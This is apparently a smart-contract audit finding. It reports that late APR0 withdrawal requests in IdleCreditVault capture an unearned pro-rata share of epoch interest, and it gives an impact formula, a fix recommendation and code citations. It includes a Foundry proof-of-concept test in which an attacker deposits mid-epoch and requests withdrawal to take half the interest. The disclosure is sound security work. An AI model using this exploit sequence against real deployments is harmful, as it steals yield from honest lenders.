### Title
Late APR0 withdrawal requests receive an unearned pro-rata share of epoch interest - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
An APR0 withdrawal requested immediately before `stopEpoch` is added to `apr0TotalPrincipal` and receives the same per-principal share of realized epoch interest as capital that was queued for the entire epoch. [1](#0-0) [2](#0-1) 

### Finding Description
When `unscaledApr == 0`, `IdleCreditVault.requestWithdraw` routes the receipt amount into `_requestWithdrawApr0` rather than recording it as an ordinary funded withdrawal. [3](#0-2)  `_requestWithdrawApr0` only stores the current `epochNumber` and adds the full amount to `apr0TotalPrincipal`; it does not record when during the epoch the request was created. [1](#0-0) 

At `stopEpoch`, `prepareStopEpochWithApr0` allocates realized override interest pro rata over the entire current `apr0TotalPrincipal` bucket and records a single `apr0RateByEpoch[epochNumber]`. [4](#0-3) [5](#0-4)  A request submitted in the last transaction before the honest manager stops the epoch therefore earns the same per-unit rate as a request submitted before the epoch began.

An eligible lender can amplify this by making a mid-epoch deposit when deposits are enabled: `depositDuringEpoch` mints tranche shares against the expected final NAV, sends the new principal to the borrower, and does not prohibit an immediate withdrawal request. [6](#0-5) [7](#0-6)  Calling `requestWithdraw` then removes that principal from live NAV while placing it into the APR0 bucket. [8](#0-7) 

### Impact Explanation
This breaks the fair yield-distribution invariant by granting epoch interest to capital that did not fund the epoch.

With zero withdrawal and management fees, existing active principal `P`, attacker deposit/request `D`, and realized override interest `I`, the attacker receives approximately:

```text
attackerInterest = I * D / (P + D)
```

The equal pro-rata formula is implemented directly by `prepareStopEpochWithApr0`. [9](#0-8)  If `D == P`, a last-block deposit and withdrawal request captures half of the epoch’s realized APR0 interest despite being present only for the terminal transaction sequence.

The stolen amount is funded as a real withdrawal liability: the APR0 net interest is added to `pendingWithdraws`, and `stopEpoch` pulls `pendingWithdraws` from the borrower before making it claimable. [5](#0-4) [10](#0-9) [11](#0-10)  Claiming later settles the stored per-epoch rate into `settledInterest` and pays it to the attacker. [12](#0-11) [13](#0-12) 

### Likelihood Explanation
The attack requires a deployment operating with `unscaledApr == 0`, withdraw requests enabled, a KYC-passed attacker, and either existing tranche holdings or mid-epoch deposits enabled. [14](#0-13) [6](#0-5)  No privileged action by the attacker is required; the honest manager’s ordinary `stopEpoch` performs the faulty global APR0 settlement. [15](#0-14) 

The theft is most profitable when the manager supplies a positive realized-interest override while the nominal APR is zero, which is an explicitly supported `stopEpoch` mode. [16](#0-15) [17](#0-16)  Upfront withdrawal fees reduce profitability, but do not repair the missing time-weighting or prevent the extra principal from being included in the global rate.

### Recommendation
APR0 reward accounting should be duration-aware or finalized before new principal can enter the current bucket.

A robust fix would record each user’s APR0 request timestamp and allocate realized interest using a time-weighted principal integral, or settle/close the APR0 accumulator before allowing additional requests for the epoch being settled. Alternatively, APR0 requests submitted after epoch start should be assigned to the next epoch’s accumulator rather than the current `epochNumber`. [1](#0-0) 

### Proof of Concept
The following Foundry-style sequence is reproducible on an `IdleCDOEpochVariant` plus `IdleCreditVault` fork where APR is zero, fees are zero for clarity, mid-epoch deposits are enabled, and `attacker` passes `isWalletAllowed`.

```solidity
function test_Apr0LateRequestStealsEpochInterest() external {
    uint256 victimDeposit = 1_000_000e6;
    uint256 attackerDeposit = 1_000_000e6;
    uint256 realizedInterest = 100_000e6;

    // Honest victim enters before the epoch.
    vm.prank(victim);
    cdo.depositAA(victimDeposit);

    _startEpoch();

    // Attacker enters and immediately exits near the end of the same epoch.
    deal(underlying, attacker, attackerDeposit);
    vm.startPrank(attacker);
    IERC20(underlying).approve(address(cdo), attackerDeposit);
    uint256 minted = cdo.depositDuringEpoch(attackerDeposit, address(AAtranche));
    uint256 receipt = cdo.requestWithdraw(minted, address(AAtranche));
    vm.stopPrank();

    vm.warp(cdo.epochEndDate() + 1);

    // Honest borrower funds principal plus realized epoch interest.
    uint256 pending = IdleCreditVault(strategy).pendingWithdraws();
    deal(underlying, borrower, pending + realizedInterest);
    vm.prank(borrower);
    IERC20(underlying).approve(address(cdo), pending + realizedInterest);

    // Honest manager settles epoch with override interest.
    vm.prank(manager);
    cdo.stopEpoch(0, realizedInterest);

    uint256 before = IERC20(underlying).balanceOf(attacker);
    vm.prank(attacker);
    cdo.claimWithdrawRequest();
    uint256 claimed = IERC20(underlying).balanceOf(attacker) - before;

    // With equal principal and no fees, the attacker receives half of realized interest.
    assertEq(receipt, attackerDeposit);
    assertApproxEqAbs(
        claimed,
        attackerDeposit + realizedInterest / 2,
        2,
        "late APR0 request received unearned epoch interest"
    );
}
```

The expected assertion follows the repository’s own APR0 settlement semantics: epoch interest is divided by active TVL plus all current APR0 principal, then paid through the settled withdrawal claim. [18](#0-17) [19](#0-18)

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L281-294)
```text
    // save the epoch of the last withdraw request (buffer + epochDuration is 1 epoch)
    lastWithdrawRequest[_user] = currentEpoch;
    // APR=0 requests keep separate accounting and settle interest at stopEpoch.
    // `_amount` here is the post-management-fee principal bucket for that flow.
    if (unscaledApr == 0 && !isClosed) {
      _requestWithdrawApr0(_amount, _user);
    } else {
      // increase the withdraw requests for the user
      // we record both per-user (old, kept for compatibility) and per-epoch so
      // on finalization we can distinguish "default-epoch pending receipts"
      // from old funded receipts.
      withdrawsRequests[_user] += _amount;
      withdrawsRequestsByEpoch[_user][currentEpoch] += _amount;
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L338-349)
```text
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L513-540)
```text
    if (_expInterest > 1 && _expInterest > _pendingFees) {
      // Remove already booked withdraw fees from the interest base before splitting.
      uint256 _interestNetOfFees = _expInterest - _pendingFees;
      // Total principal used for the pro-rata split:
      // IdleCDO TVL (which excludes APR0 requested principal) + APR0 principal bucket.
      uint256 _totalPrincipalForSplit = _tvl + _principal;
      if (_totalPrincipalForSplit != 0) {
        // APR0 users get a pro-rata share of realized interest.
        uint256 _apr0InterestGross = _interestNetOfFees * _principal / _totalPrincipalForSplit;
        if (_apr0InterestGross != 0) {
          // Same fee model as normal withdraw interest.
          uint256 _apr0Fee = _apr0InterestGross * _cdo.fee() / FULL_ALLOC;
          _apr0NetInterest = _apr0InterestGross - _apr0Fee;
          _adjPendingWithdrawFees += _apr0Fee;
          _expInterest -= _apr0NetInterest;
        }
      }
    }

    // Finalize one-epoch APR0 interest for current epoch only.
    if (_apr0NetInterest != 0) {
      // Funds owed to withdraw requesters increase by APR0 net interest.
      pendingWithdraws += _apr0NetInterest;
      // Save per-epoch net rate; each APR0 request accrues exactly once on its request epoch.
      apr0RateByEpoch[epochNumber] = (_apr0NetInterest * 1e18) / _principal;
    }
    // Close current APR0 bucket so it cannot accrue again on later stopEpoch calls.
    apr0TotalPrincipal = 0;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L545-564)
```text
  function _settleApr0(address _user) internal {
    Apr0UserData storage _apr0User = apr0Users[_user];
    uint256 _principal = _apr0User.principal;
    if (_principal == 0) {
      return;
    }
    uint256 _reqEpoch = _apr0User.principalEpoch;
    // Settle only after stopEpoch bumped epochNumber (ie after one full wait epoch).
    if (_reqEpoch >= epochNumber) {
      return;
    }
    // Move principal from "open APR0 bucket" to "settled bucket" (same principal, not duplicated).
    _apr0User.settledPrincipal += _principal;
    uint256 _rate = apr0RateByEpoch[_reqEpoch];
    if (_rate != 0) {
      // Convert per-epoch rate to claimable underlying interest.
      _apr0User.settledInterest += (_principal * _rate) / 1e18;
    }
    _apr0User.principal = 0;
    _apr0User.principalEpoch = 0;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L567-577)
```text
  function _requestWithdrawApr0(uint256 _amount, address _user) internal {
    // Settle any previous APR0 request first, then start/update current epoch bucket.
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    if (_apr0User.principal == 0) {
      _apr0User.principalEpoch = epochNumber;
    }
    _apr0User.principal += _amount;
    // Epoch-level APR0 principal used only to compute stopEpoch APR0 pro-rata interest.
    apr0TotalPrincipal += _amount;
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L313-321)
```text
  /// @notice Stop epoch, accrue interest to the vault and get funds to fullfill normal
  /// (ie non-instant) withdraw requests from the prev epoch.
  /// @param _newApr New apr to set for the next epoch
  /// @param _interest Interest gained in the epoch. This will overwrite the expected interest
  /// must be 0 if there is no need to overwrite the expected interest and if > 0 then it should
  /// be greater than the pending withdraw fees and newApr must be 0. If `_interest` is 1 then
  /// it is interpreted as a special case where we request everything back from the borrower.
  /// Programmable borrowers only support `_interest` values `0` and `1`.
  /// @dev Only owner or manager can call this function. Borrower MUST approve this contract
```

**File:** contracts/IdleCDOEpochVariant.sol (L322-365)
```text
  function stopEpoch(uint256 _newApr, uint256 _interest) public {
    _stopEpoch(_newApr, _interest, 0);
  }

  /// @notice Internal stop-epoch implementation with optional proportional pending-receipt loss.
  /// @param _newApr New apr to set for the next epoch
  /// @param _interest Interest gained in the epoch
  /// @param _lossAmount Loss amount to split between active LPs and pending receipts
  function _stopEpoch(uint256 _newApr, uint256 _interest, uint256 _lossAmount) private {
    _checkOnlyOwnerOrManager();
    bool _isRequestingAllFunds = _interest == 1;
    _checkProgrammableBorrowerMode();

    IdleCreditVault _strategy = IdleCreditVault(strategy);
    uint256 _pendingWithdrawFees = pendingWithdrawFees;

    _checkNotAllowed(
      // Check that epoch is running
      !isEpochRunning || 
      // Check that end date is passed
      block.timestamp < epochEndDate || 
      // Check that there are no pending instant withdraws, ie `getInstantWithdrawFunds` was called
      // before closing the epoch
      _pendingInstant() != 0 ||
      // Check that overridden interest, if passed (ie > 1), is greater than pending withdraw fees and the apr is 0 
      // otherwise withdrawal requests may not be fullfilled as they consider also the interest gained in the next epoch 
      (_interest > 1 && (_interest < _pendingWithdrawFees || _newApr != 0)) ||
      // Closing already recalls all principal, so applying a separate loss burn would strand returned cash.
      (_isRequestingAllFunds && _lossAmount != 0)
    );

    uint256 _totBorrowed = _beforeStopEpoch(_isRequestingAllFunds);
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    _interest = _resolveStopEpochInterest(_interest);

    // Base interest for stopEpoch: explicit override (>1) or precomputed expected epoch interest.
    uint256 _expectedInterest;
    // Strategy finalizes APR0 bucket state and returns adjusted stopEpoch values.
    (_expectedInterest, _pendingWithdrawFees) = _strategy.prepareStopEpochWithApr0(_interest);
    // Pending withdraws may be increased during APR0 settlement, so read after prepareStopEpochWithApr0.
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();

```

**File:** contracts/IdleCDOEpochVariant.sol (L406-410)
```text
    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
```

**File:** contracts/IdleCDOEpochVariant.sol (L656-669)
```text
  function depositDuringEpoch(uint256 _amount, address _tranche) external virtual returns (uint256 _minted) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == BBTranche && !isBBDepositEnabled) ||
      isDepositDuringEpochDisabled ||
      skipDefaultCheck ||
      // programmable borrowers use APR=0 so mid-epoch deposits would dilute existing depositors
      isProgrammableBorrower ||
      // check if AYS is active as we don't support deposits during epoch in that case
      isAYSActive ||
      // check if epoch is still running even if not manually stopped yet
      !isEpochRunning || block.timestamp >= epochEndDate ||
      !isWalletAllowed(msg.sender)
    );
```

**File:** contracts/IdleCDOEpochVariant.sol (L719-732)
```text
    // mint at a discounted price so depositor gets principal + its prorated interest at epoch end
    // A mid‑epoch depositor should get _amount + trancheInterest at epoch end.
    // So they need minted = (amount + trancheInterest) / priceEnd.
    // priceEnd = expectedFinal / _trancheTotSupply
    // so minted = (amount + trancheInterest) * _trancheTotSupply / expectedFinal
    _minted = (_amount + trancheInterest) * _trancheTotSupply / expectedFinal;
    _mintShares(_tranche, msg.sender, _minted, _amount);

    // update expected epoch interest
    expectedEpochInterest += interest;
    // mint strategy tokens to this contract
    IdleCreditVault(strategy).mintStrategyTokens(_amount);
    // transfer underlyings to the borrower
    _transferUnderlyings(_borrower(), _amount);
```

**File:** contracts/IdleCDOEpochVariant.sol (L772-790)
```text
    uint256 principal = _underlyings;
    (uint256 interest, int256 diff) = _calcInterestWithdrawRequest(_underlyings, _tranche);
    uint256 totalFees = _totalWithdrawFees(principal, interest);
    // user is requesting principal + interest minus upfront management fee and net performance fee
    _underlyings = principal + interest - totalFees;
    // add expected fees to pending withdraw fees counter
    pendingWithdrawFees += totalFees;

    /// if there is an AA withdrawal the overperformance that the amount withdrawed would have generated for BB tranches
    /// is saved in interestForOverUnderPerformance. This is used to calculate the interest that should be added to the
    /// expectedEpochInterest at the startEpoch.
    /// If there is a BB withdrawal this amount is subtracted from the expectedEpochInterest
    interestForOverUnderPerformance += diff;

    // The receipt is fixed now and leaves live NAV. Charge management fees upfront
    // for the time it waits outside live NAV: remaining buffer plus the next epoch.
    creditVault.requestWithdraw(_underlyings, msg.sender, principal);
    // burn tranche tokens and decrease NAV without interest for the next epoch as it was not yet counted in NAV
    _withdrawOps(_amount, principal, _tranche);
```

**File:** test/foundry/IdleCreditVault.t.sol (L2979-3027)
```text
  function testApr0WithdrawGetsInterestAtStopEpoch() external {
    // Scenario: APR is 0 at request time and stopEpoch receives a positive override interest.
    // Expectation: requester receives principal + pro-rata APR0 interest on claim.
    _setFeeParams(TL_MULTISIG, 0, FULL_ALLOC, cdoEpoch.managementFee());
    vm.prank(owner);
    cdoEpoch.setIsAYSActive(false);
    vm.prank(manager);
    IdleCreditVault(address(strategy)).setAprs(0, 0);

    uint256 amount = 10000 * ONE_SCALE;
    idleCDO.depositAA(amount);
    _transferBurnedTrancheTokens(address(this), true);

    // start epoch 0
    _startEpochAndCheckPrices(0);

    // stop epoch 0 and set next apr to 0
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 expectedInterest = cdoEpoch.expectedEpochInterest();
    deal(defaultUnderlying, borrower, expectedInterest);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    _forceLastEpochAprToZero();

    // request withdraw while apr is 0 (principal only)
    uint256 trancheBal = IERC20(AAtranche).balanceOf(address(this));
    uint256 trancheReq = trancheBal / 2;
    uint256 principal = cdoEpoch.requestWithdraw(trancheReq, address(AAtranche));
    uint256 poolPrincipal = cdoEpoch.getContractValue();

    // start epoch 1 (apr still 0)
    _startEpochAndCheckPrices(1);

    // stop epoch 1 with override interest (pool interest)
    uint256 poolInterest = 1000 * ONE_SCALE;
    vm.warp(cdoEpoch.epochEndDate() + 1);
    uint256 pendingWithdraws = IdleCreditVault(address(strategy)).pendingWithdraws();
    deal(defaultUnderlying, borrower, poolInterest + pendingWithdraws + amount);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, poolInterest);

    uint256 balBefore = underlying.balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    uint256 balAfter = underlying.balanceOf(address(this));

    uint256 totalPrincipal = poolPrincipal + principal;
    uint256 expectedWithdrawInterest = totalPrincipal == 0 ? 0 : poolInterest * principal / totalPrincipal;
    assertApproxEqAbs(balAfter - balBefore, principal + expectedWithdrawInterest, 5, "apr0 withdraw interest wrong");
```
